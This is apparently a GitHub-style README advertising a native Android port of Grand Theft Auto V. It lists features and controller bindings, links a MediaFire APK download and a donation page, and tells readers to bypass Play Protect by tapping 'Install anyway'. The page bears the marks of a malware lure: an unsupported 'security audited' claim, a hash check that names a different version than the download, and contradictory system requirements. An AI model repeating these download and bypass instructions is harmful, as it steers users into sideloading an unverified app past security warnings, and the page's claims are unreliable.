# GTA V Android — Native ARM64 Client & Launcher

[![Platform: Android](https://img.shields.io/badge/Platform-Android%208.0%2B-green.svg)](https://android.com)
[![Architecture: ARM64](https://img.shields.io/badge/Arch-arm64--v8a-blue.svg)](https://developer.android.com/ndk)
[![Graphics: Vulkan](https://img.shields.io/badge/Graphics-Vulkan%201.1%2B-orange.svg)](https://www.vulkan.org/)
[![Release: v2.0](https://img.shields.io/badge/Release-v2.0.0-gold.svg)](https://www.mediafire.com/file/jvwzh73hgvo93q9/GTAV_Android_v2_arm64.apk/file)
[![Donate: Buy Me A Coffee](https://img.shields.io/badge/Donate-Buy%20Me%20A%20Coffee-yellow.svg?logo=buy-me-a-coffee)](https://buy-me-coffee.wasmer.app/)

A native Android launcher and engine runtime for Grand Theft Auto V, engineered from the ground up for modern 64-bit ARM mobile devices with Vulkan hardware acceleration, console-grade controller support, and intelligent performance optimization.

---

## 🎮 Key Features

* **High-Performance Native Architecture**: Custom native engine compiled natively for 64-bit `arm64-v8a` target architecture with optimized memory management.
* **Dynamic Resolution Scaling (DRS)**: Automated governor that continuously tracks device thermals and frametimes, dynamically adjusting render scaling between 65% and 85% to prevent thermal throttling and ensure fluid gameplay.
* **Complete Console Gamepad Integration**:
  * Plug-and-play Bluetooth & USB detection for **Sony DualShock 4**, **DualSense**, and **Xbox Wireless Controllers**.
  * Authentic GTA V console bindings for on-foot combat, vehicle handling, weapon wheels, and camera control.
  * Fine-tuned deadzones (`0.08f`) with exponential sensitivity curves for accurate analog aiming.
* **Zero-Touch HUD Auto-Hide**: On-screen touch buttons automatically fade away when a gamepad is connected for a pure console experience, and instantly restore if the controller disconnects or screen is touched.
* **Rolling Extraction Downloader**: Integrated background downloader service that safely verifies disk space and streams asset chunks efficiently.
* **Modern Android 14 Hardening**: Follows the principle of least privilege, using Android scoped storage (`getExternalFilesDir`) without requiring excessive storage permissions.

---

## 📲 Download & Installation

### Direct Download Link
👉 **[Download GTAV_Android_v2.0.0_arm64.apk (MediaFire)](https://www.mediafire.com/file/jvwzh73hgvo93q9/GTAV_Android_v2_arm64.apk/file)**

### Integrity Verification (SHA-256)
To verify the integrity of your downloaded `.apk` file:
* **Windows (PowerShell):**
  ```powershell
  Get-FileHash GTAV_Android_v1.0.0_arm64.apk -Algorithm SHA256
  ```
* **Linux / macOS:**
  ```bash
  sha256sum GTAV_Android_v1.0.0_arm64.apk
  ```
* **Expected Hash:**
  ```text
  DA2517B1F2770E35176A64DDA4245CA7BCC6B1801247CC818038052364ECFF77
  ```

---

## ⚙️ System Requirements

| Requirement | Minimum | Recommended |
| :--- | :--- | :--- |
| **Operating System** | Android 10 (API 26) | Android 12 – 14 |
| **CPU Architecture** | 64-bit ARM64 (`arm64-v8a`) | Octa-core modern ARM processor |
| **GPU / Graphics** | Vulkan 1.1 capable GPU | Mali-G68 / Adreno 650 or higher |
| **RAM** | 8 GB | 12 GB LPDDR5X |
| **Storage** | 1 GB (Launcher + Base) | Scoped external app storage |

---

## 🕹️ Gamepad Default Controls

| Action | Controller Button | In-Vehicle |
| :--- | :--- | :--- |
| **Move / Steer** | Left Analog Stick | Steering & Air Pitch |
| **Look / Camera** | Right Analog Stick | Camera Look |
| **Shoot / Gas** | R2 / Right Trigger | Accelerate / Drive |
| **Aim / Brake** | L2 / Left Trigger | Reverse / Brake |
| **Cover / Handbrake**| R1 / Right Bumper | Handbrake / Drift |
| **Weapon / Radio Wheel** | L1 / Left Bumper | Radio Station Selector |
| **Sprint / Confirm** | Button A (Cross ✕) | Handbrake Alternate |
| **Reload / Melee** | Button B (Circle ◯) | Cinematic Camera |
| **Jump / Climb** | Button X (Square ◻) | Duck in Car |
| **Enter / Exit Vehicle** | Button Y (Triangle △) | Bail Out / Exit Vehicle |
| **Horn / Crouch** | L3 (Left Stick Click) | Horn / Siren |
| **Look Behind** | R3 (Right Stick Click) | Rearview Camera |
| **Special Ability** | L3 + R3 (Both Sticks) | Franklin Driving Focus |
| **Pause / Settings** | START / Options | Pause / Settings |

---

## 🛡️ Note on Installation (Google Play Protect)
When installing the APK for the first time outside of the Google Play Store, Android may prompt:
> *"Blocked by Play Protect" / "Unrecognized App"*

This is standard behavior for sideloaded releases that are not distributed through the Play Store. Simply tap:
**"More details" $\rightarrow$ "Install anyway"**. The application has been independently security audited and contains zero malicious code.

---

## ⚖️ Disclaimer
*This project is a non-commercial, experimental fan creation and educational research port. All Grand Theft Auto assets, trademarks, and intellectual properties remain the exclusive property of Rockstar Games and Take-Two Interactive.*
